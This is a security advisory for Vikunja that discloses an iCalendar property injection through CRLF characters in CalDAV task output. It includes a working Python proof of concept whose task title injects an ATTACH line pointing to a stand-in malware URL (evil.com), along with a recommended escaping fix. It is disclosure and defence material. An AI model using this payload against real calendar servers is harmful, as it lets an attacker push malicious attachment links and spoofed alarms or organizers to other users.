# [M] Vikunja has iCalendar Property Injection via CRLF in CalDAV Task Output

## Summary
Severity: Medium
Advisory: GHSA-2g7h-7rqr-9p4r
CVE: CVE-2026-35601
CWE: CWE-93
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:L/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-2g7h-7rqr-9p4r
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0 <2.3.0

## Details
## Summary

The CalDAV output generator builds iCalendar VTODO entries via raw string concatenation without applying RFC 5545 TEXT value escaping. User-controlled task titles containing CRLF characters break the iCalendar property boundary, allowing injection of arbitrary iCalendar properties such as `ATTACH`, `VALARM`, or `ORGANIZER`.

## Details

The `ParseTodos` function at `pkg/caldav/caldav.go:146` concatenates the task summary directly into the iCalendar output:

```go
SUMMARY:` + t.Summary + getCaldavColor(t.Color)
```

RFC 5545 Section 3.3.11 requires TEXT property values to escape newlines as `\n`, semicolons as `\;`, commas as `\,`, and backslashes as `\\`. None of these escaping rules are applied to `Summary`, `Categories`, `UID`, project name, or alarm `Description` fields.

Go's JSON decoder preserves literal CR/LF bytes in string values, so task titles created via the REST API retain CRLF characters. When these tasks are served via CalDAV, the newlines break the `SUMMARY` property and the subsequent text is parsed by CalDAV clients as independent iCalendar properties.

## Proof of Concept

Tested on Vikunja v2.2.2.

```python
import requests
from requests.auth import HTTPBasicAuth

TARGET = "http://localhost:3456"
API = f"{TARGET}/api/v1"

token = requests.post(f"{API}/login",
    json={"username": "alice", "password": "Alice1234!"}).json()["token"]
h = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

proj = requests.put(f"{API}/projects", headers=h, json={"title": "CalDAV Test"}).json()

# create task with CRLF injection in title
task = requests.put(f"{API}/projects/{proj['id']}/tasks", headers=h, json={
    "title": "Meeting\r\nATTACH:https://evil.com/malware.exe\r\nX-INJECTED:pwned"
}).json()

# set UID (normally done by CalDAV sync; here via sqlite for PoC)
# sqlite3 vikunja.db "UPDATE tasks SET uid='inject-test-001' WHERE id={task['id']};"
TASK_UID = "inject-test-001"

# fetch via CalDAV
caldav_token = requests.put(f"{API}/user/settings/token/caldav", headers=h).json()["token"]
r = requests.get(f"{TARGET}/dav/projects/{proj['id']}/{TASK_UID}.ics",
                 auth=HTTPBasicAuth("alice", caldav_token))
print(r.text)
```

Output:
```
BEGIN:VCALENDAR
VERSION:2.0
BEGIN:VTODO
UID:inject-test-001
DTSTAMP:20260327T130452Z
SUMMARY:Meeting
ATTACH:https://evil.com/malware.exe
X-INJECTED:pwned
CREATED:20260327T130452Z
LAST-MODIFIED:20260327T130452Z
END:VTODO
END:VCALENDAR
```

The `ATTACH` and `X-INJECTED` lines appear as separate, valid iCalendar properties. CalDAV clients will parse these as legitimate properties.

## Impact

An authenticated user with write access to a shared project can create tasks with CRLF-injected titles via the REST API. When other users sync via CalDAV, the injected properties take effect in their calendar clients. This enables:
- Injecting malicious attachment URLs (`ATTACH`) that clients may auto-download or display
- Creating fake alarm notifications (`VALARM`) for social engineering
- Spoofing organizer identity (`ORGANIZER`)

## Recommended Fix

Apply RFC 5545 TEXT value escaping to all user-controlled fields:

```go
func escapeICal(s string) string {
    s = strings.ReplaceAll(s, "\\", "\\\\")
    s = strings.ReplaceAll(s, ";", "\\;")
    s = strings.ReplaceAll(s, ",", "\\,")
    s = strings.ReplaceAll(s, "\n", "\\n")
    s = strings.ReplaceAll(s, "\r", "")
    return s
}
```

Apply `escapeICal()` to `t.Summary`, `config.Name`, `t.Categories` items, `a.Description`, `t.UID`, and `r.UID`.

---
*Found and reported by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-2g7h-7rqr-9p4r
- https://nvd.nist.gov/vuln/detail/CVE-2026-35601
- https://github.com/go-vikunja/vikunja/pull/2580
- https://github.com/go-vikunja/vikunja
- https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0
